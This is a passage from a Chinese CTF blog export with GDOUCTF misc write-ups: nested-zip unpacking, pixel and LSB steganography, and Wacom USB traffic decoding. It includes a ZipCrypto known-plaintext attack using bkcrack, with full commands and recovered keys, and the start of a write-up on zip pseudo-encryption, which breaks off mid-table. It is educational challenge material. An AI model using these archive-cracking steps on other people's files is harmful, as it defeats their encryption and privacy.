class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br>filepath = <span class="hljs-string">&quot;C://Users/LIKE/Desktop/zip/Matryoshka/&quot;</span><br><br>fileName = <span class="hljs-string">&quot;Matryoshka1000.zip&quot;</span><br><br>path = filepath+fileName<br>count = <span class="hljs-number">1000</span><br><br><span class="hljs-keyword">while</span> zipfile.is_zipfile(path):<br>    file = zipfile.ZipFile(path)<br>    ls = file.namelist()<br>    pwdName = <span class="hljs-string">&quot;password&quot;</span> + <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&quot;.txt&quot;</span><br><br>    <span class="hljs-keyword">if</span> ls[<span class="hljs-number">0</span>].startswith(<span class="hljs-string">&quot;password&quot;</span>):<br>        pName = ls[<span class="hljs-number">0</span>]<br>        zipName = ls[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        pName = ls[<span class="hljs-number">1</span>]<br>        zipName = ls[<span class="hljs-number">0</span>]<br><br>    pwdpath = os.path.join(filepath,pwdName)<br>    <span class="hljs-comment"># print(pwdpath)</span><br>    f = <span class="hljs-built_in">open</span>(pwdpath,<span class="hljs-string">&quot;r&quot;</span>,errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(pwdpath)<br>    data = f.read()<br>    <span class="hljs-comment"># print(data)</span><br><br>    data = data.replace(<span class="hljs-string">&quot;zero&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>).replace(<span class="hljs-string">&quot;one&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>).replace(<span class="hljs-string">&quot;two&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>).replace(<span class="hljs-string">&quot;three&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>).replace(<span class="hljs-string">&quot;four&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>).replace(<span class="hljs-string">&quot;five&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>).replace(<span class="hljs-string">&quot;six&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>).replace(<span class="hljs-string">&quot;seven&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>).replace(<span class="hljs-string">&quot;eight&quot;</span>,<span class="hljs-string">&quot;8&quot;</span>).replace(<span class="hljs-string">&quot;nine&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>).replace(<span class="hljs-string">&quot;plus&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;times&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>).replace(<span class="hljs-string">&quot;minus&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>).replace(<span class="hljs-string">&quot;mod&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>)<br><br>    value = re.split(<span class="hljs-string">&quot;[+\-*%]&quot;</span>,data)<br>    char = re.sub(<span class="hljs-string">&quot;\d&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,data)<br><br>    <span class="hljs-built_in">sum</span> = value[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>.startswith(<span class="hljs-string">&quot;0&quot;</span>):  <span class="hljs-comment"># 取消掉最前面的0</span><br>            <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span>[<span class="hljs-number">1</span>:]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(char)):<br><br>        v = value[i+<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> v.startswith(<span class="hljs-string">&quot;0&quot;</span>):  <span class="hljs-comment"># 取消掉最前面的0</span><br>            v = v[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">if</span> v.startswith(<span class="hljs-string">&quot;0&quot;</span>):  <span class="hljs-comment"># 取消掉最前面的0</span><br>            v = v[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">if</span> v.startswith(<span class="hljs-string">&quot;0&quot;</span>):  <span class="hljs-comment"># 取消掉最前面的0</span><br>            v = v[<span class="hljs-number">1</span>:]<br><br>        <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">sum</span>)+char[i]+v)<br><br>    pwd = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">sum</span>)).encode()<br>    despath = <span class="hljs-string">&quot;C://Users/LIKE/Desktop/zip/Matryoshka/&quot;</span><br>    file.extract(zipName,despath, pwd=pwd)<br>    file.extract(pName, despath, pwd=pwd)<br>    file.close()<br>    path = os.path.join(filepath,zipName)<br><br>    count = count - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="pixelart"><a href="#pixelart" class="headerlink" title="pixelart"></a>pixelart</h4><p>像素隐写</p><p><img src="https://s2.loli.net/2023/04/17/wRFoOPMqtNa39U7.png" alt="image-20230417201911933"></p><p>图片放大后发现有很多像素点：</p><img src="https://s2.loli.net/2023/04/17/XntfQhU7dPmJZHL.png" alt="image-20230417202100004" style="zoom:50%;" /><p>我们使用ps量一下，发现像素水平和垂直距离都是 12px，所以需要每隔12像素提取一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;arcaea.png&#x27;</span>)<br>w = img.width<br>h = img.height<br>img_obj = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(w//<span class="hljs-number">12</span>,h//<span class="hljs-number">12</span>))<br><br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h//<span class="hljs-number">12</span>):<br>        (r,g,b)=img.getpixel((x*<span class="hljs-number">12</span>,y*<span class="hljs-number">12</span>))<br>        img_obj.putpixel((x,y),(r,g,b))<br><br>img_obj.save(<span class="hljs-string">&#x27;ok.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>github上的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>,<br>                    <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;输入文件名称&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>,<br>                    <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;-n&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>,<br>                    <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;-size&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&#x27;1x1&#x27;</span>, required=<span class="hljs-literal">False</span>,<br>                    <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;-resize&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">1</span>, required=<span class="hljs-literal">False</span>,<br>                    <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;</span>)<br>args  = parser.parse_args()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="hljs-keyword">and</span> re.search(<span class="hljs-string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="hljs-keyword">and</span> re.search(<span class="hljs-string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):<br>        x1, y1 = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x), args.p.split(<span class="hljs-string">&quot;+&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;x&quot;</span>))<br>        x2, y2 = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x), args.p.split(<span class="hljs-string">&quot;+&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;x&quot;</span>))<br>        width, height = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x), args.n.split(<span class="hljs-string">&quot;x&quot;</span>))<br>        width_size, height_size = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x), args.size.split(<span class="hljs-string">&quot;x&quot;</span>))<br><br>        img_path = os.path.abspath(args.f)<br>        file_name = img_path.split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>]<br><br>        img = cv2.imread(img_path, cv2.IMREAD_COLOR)<br>        row, col = img.shape[:<span class="hljs-number">2</span>]<br><br>        r, c = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">range</span>(y1, y2 + <span class="hljs-number">1</span>, height)), <span class="hljs-built_in">len</span>(<span class="hljs-built_in">range</span>(x1, x2 + <span class="hljs-number">1</span>, width))<br>        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, <span class="hljs-number">3</span>))<br>        <span class="hljs-keyword">for</span> y, x <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(r), <span class="hljs-built_in">range</span>(c)):<br>            <span class="hljs-keyword">for</span> y_size <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height_size):<br>                <span class="hljs-keyword">for</span> x_size <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width_size):<br>                    <span class="hljs-comment"># new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span><br>                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)<br>                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)<br>                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()<br>                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-<span class="hljs-number">1</span>)<br>            <br><br>        cv2.imwrite(<span class="hljs-string">f&quot;_<span class="hljs-subst">&#123;file_name&#125;</span>&quot;</span>, new_img)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已保存到运行目录中...&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;参数-p或参数-n或参数-size, 输入错误!&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python .\main.py -f .\arcaea.png -p <span class="hljs-number">0x0</span>+3839x2159 -n 12x12<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/17/g8qQtJVfcG5SLl1.png" alt="fake_flag"></p><p>lsb隐写，使用zsteg一下就行</p><p><img src="https://s2.loli.net/2023/04/17/aEN6Vqczh4Dr31w.png" alt="img"></p><h4 id="getnopwd"><a href="#getnopwd" class="headerlink" title="getnopwd"></a>getnopwd</h4><blockquote><p>J_0k3r忘记了他的密码，压缩包里放着一个他<strong>熟悉的文件</strong>和一个不熟悉的文件</p></blockquote><p>这一题是明文攻击，我们需要使用 <code>bkcrack</code> 这个工具</p><p><a href="https://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.html">使用明文攻击破解加密的zip文件</a></p><p><a href="https://flandre-scarlet.moe/blog/1685/">zip明文攻击的原理</a></p><blockquote><p>明文攻击主要利用<strong>大于 12 字节的一段已知明文数据进行攻击</strong>，从而获取整个加密文档的数据。也就是说，如果我手里有一个未知密码的压缩包和压缩包内某个文件的一部分明文（不一定非要从头开始，能确定偏移就行），那么我就可以通过这种攻击来解开整个压缩包。比如压缩包里有一个常见的 license 文件，或者是某个常用的 dll 库，或者是带有固定头部的文件（比如 xml、exe、png 等容易推导出原始内容的文件），那么就可以运用这种攻击。当然，<strong>前提是压缩包要用 ZipCrypto 加密。</strong></p><p>也就是说从明文到密文的这个流程中我们有了头尾两端的数据，再利用加密算法中的弱点还原出加密密钥，从而解密整个压缩包（同一个压缩包的文件都是用同一个密钥加密）。但是仍然要注意，如果文件在加密前经过了压缩，加密算法的输入不再是我们所知道的明文而是压缩后的数据，明文攻击会失败（在压缩包里查看文件的属性可以看到压缩方式，比如“ZipCrypto Deflate”就是加密压缩，“ZipCrypto Store”就是加密储存）。这就多了找出明文压缩后的数据这样一个额外步骤。</p></blockquote><p>首先我们看一下压缩包中的文件：</p><p><img src="https://s2.loli.net/2023/04/18/87yJKD2x3Zv5QVh.png" alt="image-20230418195140676"></p><p>我们发现压缩包加密算法为：<code>ZipCrypto</code>，并且压缩包中有我们熟悉的文件类型：<code>pcapng</code></p><p><code>pcapng</code>中有一些固定的文件头，于是我们可以利用大于12个字节的文件头进行明文攻击</p><p>我们在 <a href="https://pcapng.com/">pcapng</a>官网查看一下它的格式：</p><p><img src="https://s2.loli.net/2023/04/18/E7iI6GNHjMFSgLa.png" alt="image-20230418195751867"></p><p>我们可以看到，在pcapng文件的第9个字节开始有16个字节的固定格式，可以当作明文</p><blockquote><p>通常情况下，我们的计算机都是<strong>小端存储模式</strong>。 小端：数字的低位存储到内存的低地址上。 大端：数字的低位存储到内存的高地址上。</p></blockquote><p>查阅资料得知，计算机采用小端存储模式，因此，我么需要将这些格式按照字节为单位倒序处理：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>A2B3C4D  <span class="hljs-number">0001</span>  <span class="hljs-number">0000</span> FFFFFFFFFFFFFFFF<br>=&gt;<br><span class="hljs-number">4</span>D3C2B1A  <span class="hljs-number">0100</span>  <span class="hljs-number">0000</span> FFFFFFFFFFFFFFFF<br></code></pre></td></tr></table></figure><p>即：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4D3C2B1A01000000FFFFFFFFFFFFFFFF<br></code></pre></td></tr></table></figure><p>于是我们得到了压缩包中的一段明文，我们需要使用工具 <code>bkcrack</code> 进行明文攻击</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bkcrack -C getnopwd.zip -<span class="hljs-keyword">c</span> final.pcapng  -<span class="hljs-keyword">x</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span>D<span class="hljs-number">3</span>C<span class="hljs-number">2</span>B<span class="hljs-number">1</span>A<span class="hljs-number">01000000</span>FFFFFFFFFFFFFFFF<br><br>-<span class="hljs-keyword">x</span> <span class="hljs-number">8</span> 说明这一段明文是从pcapng文件的第<span class="hljs-number">9</span>个字节开始的<br></code></pre></td></tr></table></figure><blockquote><p>-C 指定压缩包名称</p><p>-c 指定存在明文的文件</p><p>-p 存储了明文的文本</p><p>-x 已知明文数据在文件中的偏移量</p></blockquote><p>执行完代码之后会得到3个key：</p><p><img src="https://s2.loli.net/2023/04/18/DKXBbdeOTp2SAIE.png" alt="image-20230418201324233"></p><p>我们使用这3个key可以直接生成一个新的压缩包，密码为自定义。或者直接提取文件</p><p>法1：</p><p>此处我们生成新压缩包flag.zip，新密码为：easy</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bkcrack -C getnopwd<span class="hljs-selector-class">.zip</span> -c final<span class="hljs-selector-class">.pcapng</span> -k <span class="hljs-number">3290</span>bc3d <span class="hljs-number">27</span>d2d1d8 dfd4c1ae -U flag<span class="hljs-selector-class">.zip</span> easy<br></code></pre></td></tr></table></figure><blockquote><p>-k  放上生成的3个key</p><p>-U 新的压缩包 新密码</p></blockquote><p><img src="https://s2.loli.net/2023/04/18/ksiqxQgo7a5euCf.png" alt="image-20230418201619075"></p><p>然后我们直接使用 easy解压 flag.zip即可</p><p>法2：</p><p>直接提取 final.pcapng文件：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">bkcrack -C getnopwd.zip -c <span class="hljs-keyword">final</span>.pcapng -k <span class="hljs-number">3290</span>bc3d <span class="hljs-number">27</span>d2d1d8 dfd4c1ae -d <span class="hljs-keyword">final</span>.pcapng<br></code></pre></td></tr></table></figure><blockquote><p>-d 想要提取的文件名</p></blockquote><p>然后打开压缩包，发现 <code>DO_NO_BE_MISDIRECTED</code> 是个docx文件，我们后缀改为zip打开：document.xml</p><p><img src="https://s2.loli.net/2023/04/18/XDk4pzwoqIflcSC.png" alt="image-20230418201951616"></p><p>打开 <code>final.pcapng</code></p><p><img src="https://s2.loli.net/2023/04/18/DjOuxp3k7LFY4so.png" alt="image-20230418202043344"></p><p>google查一下这是什么东西：</p><p><img src="https://s2.loli.net/2023/04/18/fS2oQtpsY9ILAJU.png" alt="image-20230418202304037"></p><blockquote><p>idVendor 是生产USB设备的公司编号</p><p>idProduct 是标识产品编号</p></blockquote><p>查了一下：Wacom公司是生产数位板的</p><p><img src="https://s2.loli.net/2023/04/18/XEoyNeYDRK1B4dn.png" alt="image-20230418202618821"></p><p>ctf里有一个<strong>数位板流量分析</strong> ，</p><p>网上有一题类似的：<a href="https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/">https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/</a></p><p>我们先查看一下，发现37个字节的数据是有用的</p><p><img src="https://s2.loli.net/2023/04/18/9lg6wxupztaEWsT.png" alt="image-20230418203139073"></p><p>然后我们需要使用 <code>tshark</code> 分离数据，使用 -Y参数显示过滤掉无关数据</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">tshark -r <span class="hljs-keyword">final</span>.pcapng -T fields -Y <span class="hljs-string">&quot;usb.transfer_type == 0x01 and frame.len==37&quot;</span> -e <span class="hljs-string">&quot;usbhid.data&quot;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/18/256eTVZLSJDdOU1.png" alt="image-20230418205008149"></p><blockquote><p>-r 输入的文件名</p><p>-Y 显示过滤器、</p><p>-T 设置解码结果输出的格式</p><p>-e  如果设置了<code>-T fields</code> -e 参数用来指定输出哪些字段</p></blockquote><p>因为我们要输出的数据是 <code>HID Data</code> 所以我们需要知道 HID Data对应的<code>wireshark</code>过滤器的规则</p><p>查阅 <code>wireshak filrer</code> 文档可知为： <code>usbhid.data</code></p><p><img src="https://s2.loli.net/2023/04/18/LWTGJna1KezR29g.png" alt="image-20230418204844184"></p><p>输出结果如下：</p><p><img src="https://s2.loli.net/2023/04/18/TFE3R2jPbxsfpmn.png" alt="image-20230418205035055"></p><p>然后我们需要知道<code>数位板</code>存储数据的格式(<strong>小端存储</strong>):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Example</span>: <br><span class="hljs-attribute">02</span>:f0:<span class="hljs-number">50</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">72</span>:<span class="hljs-number">1</span>a:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span><br><span class="hljs-attribute">Bytes</span>:<br><span class="hljs-attribute">02</span>:f0: -- Header<br><span class="hljs-attribute">50</span>:<span class="hljs-number">1</span>d: -- X<br><span class="hljs-attribute">72</span>:<span class="hljs-number">1</span>a: -- Y<br><span class="hljs-attribute">00</span>:<span class="hljs-number">00</span>: -- Pressure<br><span class="hljs-attribute">12</span> -- Suffix<br></code></pre></td></tr></table></figure><p>我们可以提取那些 X、Y 并用笔查看 Wacom 数位板上的移动。但首先我们必须在明文文件中分离数据才能使用它。</p><p>但是由于小端存储，提取数据时，我们需要交换一下数据，逆序一下</p><p>我们写个脚本将 X、Y、Z提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>lines = f.readlines()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>line = line.strip()<br>x = line[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>][<span class="hljs-number">2</span>:] + line[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>][:<span class="hljs-number">2</span>]<br>y = line[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>][<span class="hljs-number">2</span>:] + line[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>][:<span class="hljs-number">2</span>]<br>z = line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>][<span class="hljs-number">2</span>:] + line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>][:<span class="hljs-number">2</span>]<br>s = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>))+<span class="hljs-string">&quot; &quot;</span>+ <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(y, <span class="hljs-number">16</span>))+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(z, <span class="hljs-number">16</span>))<br>f1.write(s+<span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后我们使用 <code>gnuplot</code> 将该坐标画图画出来即可：</p><p><img src="https://s2.loli.net/2023/04/18/jBaUODnf9MR7pI2.png" alt="image-20230418210202154"></p><p>颠倒一下：</p><p><img src="https://s2.loli.net/2023/04/18/bk8KhoMlstXgpuC.png" alt="image-20230418210228881"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GDOUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fxz靶场</title>
    <link href="/2023/08/24/fxz%E9%9D%B6%E5%9C%BA/"/>
    <url>/2023/08/24/fxz%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="风信子靶场"><a href="#风信子靶场" class="headerlink" title="风信子靶场"></a>风信子靶场</h1><h2 id="1、MISC"><a href="#1、MISC" class="headerlink" title="1、MISC"></a>1、MISC</h2><h3 id="1-1xxxxFuck"><a href="#1-1xxxxFuck" class="headerlink" title="1.1xxxxFuck"></a>1.1xxxxFuck</h3><img src="https://s2.loli.net/2022/11/25/OoHLzwr3y4dX8V7.png" alt="image-20221111225324194" style="zoom: 33%;" /><p>下载后打开文件，发现打不开：</p><img src="https://s2.loli.net/2022/11/25/EvS1Kse9QHq82c7.png" alt="image-20221111225414915" style="zoom:33%;" /><p>zip相关文件知识：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs maxima">一个 ZIP 文件由三个部分组成：<br> <br>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志<br> <br>压缩源文件数据区：<br><span class="hljs-number">50</span> 4B <span class="hljs-number">03</span> <span class="hljs-number">04</span>：这是头文件标记（<span class="hljs-number">0x04034b50</span>）<br><span class="hljs-number">14</span> <span class="hljs-number">00</span>：解压文件所需 pkware 版本<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：全局方式位标记（有无加密）<br><span class="hljs-number">08</span> <span class="hljs-number">00</span>：压缩方式<br>5A 7E：最后修改文件时间<br>F7 <span class="hljs-number">46</span>：最后修改文件日期<br><span class="hljs-number">16</span> B5 <span class="hljs-number">80</span> <span class="hljs-number">14</span>：CRC-<span class="hljs-number">32</span>校验（<span class="hljs-number">1480B516</span>）<br><span class="hljs-number">19</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：压缩后尺寸（<span class="hljs-number">25</span>）<br><span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：未压缩尺寸（<span class="hljs-number">23</span>）<br><span class="hljs-number">07</span> <span class="hljs-number">00</span>：文件名长度<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：扩展记录长度<br> <br>压缩源文件目录区：<br><span class="hljs-number">50</span> 4B <span class="hljs-number">01</span> <span class="hljs-number">02</span>：目录中文件文件头标记(<span class="hljs-number">0x02014b50</span>)<br>3F <span class="hljs-number">00</span>：压缩使用的 pkware 版本<br><span class="hljs-number">14</span> <span class="hljs-number">00</span>：解压文件所需 pkware 版本<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为<span class="hljs-number">09</span> <span class="hljs-number">00</span>打开就会提示有密码了）<br><span class="hljs-number">08</span> <span class="hljs-number">00</span>：压缩方式<br>5A 7E：最后修改文件时间<br>F7 <span 